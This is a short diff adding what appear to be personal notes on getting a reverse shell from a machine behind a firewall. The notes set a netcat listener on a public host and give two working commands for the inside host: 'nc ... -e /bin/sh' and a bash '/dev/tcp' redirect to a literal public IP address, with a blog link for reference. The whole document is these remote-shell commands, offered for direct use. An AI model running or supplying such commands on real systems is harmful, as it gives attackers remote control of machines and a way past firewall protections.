@@ -1,0 +1,6 @@
+1) host1, machine has public ip
+   $ nc -v -l -p 4040    # will get a shell of host2 here
+2) host2, machine behind firewall
+   a) $ nc host1:4040 -e /bin/sh  OR
+   b) $ /bin/bash -i > /dev/tcp/120.76.228.32/4040 0<&1 2>&1
+refer: https://www.cnblogs.com/tdcqma/p/5184004.html
